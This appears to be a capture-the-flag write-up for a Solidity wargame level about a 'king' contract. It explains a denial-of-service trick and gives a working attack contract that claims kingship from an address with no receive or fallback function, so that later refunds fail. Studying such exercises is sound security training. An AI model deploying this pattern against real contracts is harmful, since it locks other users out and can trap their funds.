### Analysis
When transfer is called on a smart contract, that smart contract's receive or fallback function will execute. Or, if neither of these are defined, then the function will fail. This functionality is what we'll exploit to solve this problem.
All we need to do is set king to a smart contract which always fails when transfer is called on it. That way, the king variable can never be updated.

### The Exploit
Deploy the follow contract,call the function of claimKingship:
~~~
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract ForeverKing {
    function claimKingship(address payable _to) public payable{
        (bool sent, ) = _to.call{value:msg.value}("");
        require(sent, "Failed to send value!");
    }
}
~~~
